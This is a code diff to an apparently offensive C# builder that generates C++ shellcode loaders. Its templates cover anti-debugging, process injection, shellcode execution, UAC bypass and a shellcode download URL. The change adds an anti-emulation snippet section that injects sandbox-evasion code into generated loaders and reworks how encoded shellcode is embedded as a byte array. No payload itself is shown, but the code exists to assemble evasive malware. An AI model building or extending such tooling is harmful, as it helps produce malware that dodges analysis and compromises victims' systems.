@@ -91,6 +91,7 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
 """;
 
     private const string TemplateAntiDebug = "ANTIDEBUGGING";
+    private const string TemplateAntiEmulation = "ANTIEMULATION";
     private const string TemplateProcessInjection = "PSINJECTION";
     private const string TemplateShellcodeExecution = "SHELLCODEEXECUTION";
     private const string TemplateUacBypass = "UACB";
@@ -103,6 +104,7 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
     private const string PlaceholderShellcodeUrl = "SHELLCODE_URL";
     private const string PlaceholderGuardrails = "GUARDRAILS";
     private const string PlaceholderAntiDebug = "ANTI_DEBUGGING";
+    private const string PlaceholderAntiEmulation = "ANTI_EMULATION";
     private const string PlaceholderUacBypass = "UAC_BYPASS";
     private const string PlaceholderProcessInjection = "PROCESS_INJECTION";
     private const string PlaceholderShellcodeExecution = "SHELLCODE_EXECUTION";
@@ -310,9 +312,40 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
         if (string.IsNullOrWhiteSpace(encoded))
             throw new InvalidOperationException("Bin2Shell returned empty output.");
 
-        plan.EncodedShellcodeSnippet = encoded.Trim();
+        plan.EncodedShellcodeSnippet = ConvertBin2ShellOutput(encoded);
         notes.Add("Encoded shellcode prepared.");
         _logger.Ok("Encoded shellcode prepared.");
+    }
+
+    private static string ConvertBin2ShellOutput(string snippet)
+    {
+        if (string.IsNullOrWhiteSpace(snippet))
+            return string.Empty;
+
+        var arrayMatch = Regex.Match(
+            snippet,
+            @"unsigned\s+char\s+\w+\s*\[\s*\]\s*=\s*\{(?<body>[\s\S]*?)\};",
+            RegexOptions.Multiline);
+
+        var lengthMatch = Regex.Match(
+            snippet,
+            @"unsigned\s+int\s+\w+\s*=\s*(?<len>\d+)\s*;");
+
+        if (arrayMatch.Success && lengthMatch.Success)
+        {
+            string body = arrayMatch.Groups["body"].Value.TrimEnd();
+            string length = lengthMatch.Groups["len"].Value.Trim();
+
+            var builder = new StringBuilder();
+            builder.AppendLine($"constexpr unsigned int code_blob_len = {length};");
+            builder.AppendLine("static const unsigned char code_blob[] = {");
+            builder.AppendLine(body);
+            builder.AppendLine("};");
+            builder.Append("const DWORD dwSize = (DWORD)code_blob_len;");
+            return builder.ToString();
+        }
+
+        return snippet.Trim();
     }
 
     private void ConfigureGenericShellcode(
@@ -628,6 +661,9 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
                 case TemplateAntiDebug:
                     ApplyAntiDebugSelection(plan, data, placeholder.Name, notes);
                     break;
+                case TemplateAntiEmulation:
+                    ApplyAntiEmulationSelection(plan, data, placeholder.Name, notes);
+                    break;
                 default:
                     ApplyGenericSnippetSelection(plan, data, placeholder, notes);
                     break;
@@ -751,6 +787,30 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
         }
     }
 
+    private void ApplyAntiEmulationSelection(
+        CppCompilationPlan plan,
+        UiData data,
+        string placeholderName,
+        ICollection<string> notes)
+    {
+        if (!_snippets.TryGetSectionByTemplate(TemplateAntiEmulation, out var section))
+        {
+            _logger.Warn("Snippet section 'ANTIEMULATION' is missing in the catalog.");
+            return;
+        }
+
+        var selections = ResolveSnippetSelections(data, section);
+        if (selections.Count == 0)
+            return;
+
+        foreach (var item in selections)
+        {
+            plan.AntiEmulationSnippets.Add(item.Snippet);
+            AddCustomSnippet(plan, placeholderName, item.Snippet);
+            LogSnippetEnabled(section.Template, item.Id, notes);
+        }
+    }
+
     private void ApplyGenericSnippetSelection(
         CppCompilationPlan plan,
         UiData data,
@@ -844,6 +904,13 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
             AddPlaceholder(values, PlaceholderAntiDebug, antiDebugBlock, overwrite: true);
         }
 
+        if (plan.AntiEmulationSnippets.Count > 0)
+        {
+            var antiEmulationContent = string.Join(Environment.NewLine, plan.AntiEmulationSnippets);
+            var antiEmulationBlock = $"// Anti-emulation{Environment.NewLine}{antiEmulationContent}";
+            AddPlaceholder(values, PlaceholderAntiEmulation, antiEmulationBlock, overwrite: true);
+        }
+
         if (!string.IsNullOrWhiteSpace(plan.UacBypassSnippet))
         {
             var uacBlock = $"// UAC bypass{Environment.NewLine}{plan.UacBypassSnippet}";
@@ -899,7 +966,6 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
         if (hasEncodedShellcode)
         {
             sb.AppendLine(plan.EncodedShellcodeSnippet!.TrimEnd());
-            sb.Append("DWORD dwSize = (DWORD)code_blob_len;");
         }
         else if (usesGenericShellcode)
         {
@@ -1060,30 +1126,12 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
 
     private IReadOnlyList<string> BuildBin2ShellArguments(UiData data, string shellcodeFile)
     {
-        var args = new List<string> { "-y", _paths.Bin2ShellAlgos };
-
-        if (TryGetEncoderIndex(data, out int encoderIndex))
+        return new List<string>
         {
-            args.Add("-e");
-            args.Add(encoderIndex.ToString(CultureInfo.InvariantCulture));
-        }
-
-        var antiSelection = GetAntiEmulationSelection(data);
-        var antiArgs = GetAntiEmulationArgs(data);
-
-        if (!string.IsNullOrWhiteSpace(antiSelection))
-        {
-            args.Add("-ae");
-            args.Add(antiSelection!);
-
-            if (!string.IsNullOrWhiteSpace(antiArgs))
-            {
-                args.Add(antiArgs!);
-            }
-        }
-
-        args.Add(shellcodeFile);
-        return args;
+            "-y",
+            _paths.Bin2ShellAlgos,
+            shellcodeFile
+        };
     }
 
     private static bool TryGetEncoderIndex(UiData data, out int index)
@@ -1120,148 +1168,6 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
 
         index = 0;
         return false;
-    }
-
-    private static string? GetAntiEmulationSelection(UiData data)
-    {
-        string[] candidateKeys =
-        {
-            "bin2shellOptions",
-            "bin2ShellOptions",
-            "bin2shellOptionCombo",
-            "bin2ShellOptionCombo",
-            "bin2shellAntiCombo",
-            "bin2ShellAntiCombo",
-            "bin2shellAntiOptions",
-            "bin2ShellAntiOptions",
-            "bin2shellAntiEmulation",
-            "bin2ShellAntiEmulation",
-            "bin2shellSelection",
-            "bin2ShellSelection"
-        };
-
-        foreach (var key in candidateKeys)
-        {
-            if (!data.ComboBoxes.TryGetValue(key, out var raw))
-                continue;
-
-            var parsed = ParseAntiEmulationToken(raw);
-            if (!string.IsNullOrWhiteSpace(parsed))
-                return parsed;
-        }
-
-        foreach (var entry in data.ComboBoxes)
-        {
-            var key = entry.Key ?? string.Empty;
-            if (key.IndexOf("bin2", StringComparison.OrdinalIgnoreCase) < 0 &&
-                key.IndexOf("anti", StringComparison.OrdinalIgnoreCase) < 0)
-            {
-                continue;
-            }
-
-            var parsed = ParseAntiEmulationToken(entry.Value);
-            if (!string.IsNullOrWhiteSpace(parsed))
-                return parsed;
-        }
-
-        return null;
-    }
-
-    private static string? ParseAntiEmulationToken(string? value)
-    {
-        if (string.IsNullOrWhiteSpace(value))
-            return null;
-
-        var trimmed = value.Trim();
-
-        if (TryParseIndex(trimmed, out int index) && index > 0)
-            return index.ToString(CultureInfo.InvariantCulture);
-
-        int dash = trimmed.IndexOf('-');
-        if (dash >= 0 && dash + 1 < trimmed.Length)
-        {
-            var tail = trimmed[(dash + 1)..].Trim();
-            if (tail.Length == 0)
-                return null;
-
-            int pipe = tail.IndexOf('|');
-            if (pipe >= 0)
-                tail = tail[..pipe].Trim();
-
-            return tail.Length > 0 ? tail : null;
-        }
-
-        int pipeOnly = trimmed.IndexOf('|');
-        if (pipeOnly >= 0)
-        {
-            var head = trimmed[..pipeOnly].Trim();
-            if (TryParseIndex(head, out index) && index > 0)
-                return index.ToString(CultureInfo.InvariantCulture);
-            if (head.Length > 0)
-                return head;
-        }
-
-        return trimmed;
-    }
-
-    private static string? GetAntiEmulationArgs(UiData data)
-    {
-        string[] candidateKeys =
-        {
-            "bin2shellArgs",
-            "bin2ShellArgs",
-            "bin2shellOptionArgs",
-            "bin2ShellOptionArgs",
-            "bin2shellAntiArgs",
-            "bin2ShellAntiArgs"
-        };
-
-        foreach (var key in candidateKeys)
-        {
-            if (!data.TextBoxes.TryGetValue(key, out var raw))
-                continue;
-
-            var normalized = NormalizeAntiEmulationArgs(raw);
-            if (!string.IsNullOrWhiteSpace(normalized))
-                return normalized;
-        }
-
-        foreach (var entry in data.TextBoxes)
-        {
-            var key = entry.Key ?? string.Empty;
-            if (key.IndexOf("bin2", StringComparison.OrdinalIgnoreCase) < 0 ||
-                key.IndexOf("arg", StringComparison.OrdinalIgnoreCase) < 0)
-            {
-                continue;
-            }
-
-            var normalized = NormalizeAntiEmulationArgs(entry.Value);
-            if (!string.IsNullOrWhiteSpace(normalized))
-                return normalized;
-        }
-
-        return null;
-    }
-
-    private static string? NormalizeAntiEmulationArgs(string? raw)
-    {
-        if (string.IsNullOrWhiteSpace(raw))
-            return null;
-
-        var noNewLines = raw.Replace("\r", string.Empty).Replace("\n", string.Empty).Trim();
-        if (noNewLines.Length == 0)
-            return null;
-
-        var segments = noNewLines
-            .Split(':', StringSplitOptions.RemoveEmptyEntries)
-            .Select(segment => segment.Trim())
-            .Where(segment => segment.Length > 0)
-            .ToArray();
-
-        if (segments.Length == 0)
-            return null;
-
-        return string.Join(":", segments);
     }
 
     private static bool TryParseIndex(string? raw, out int index)
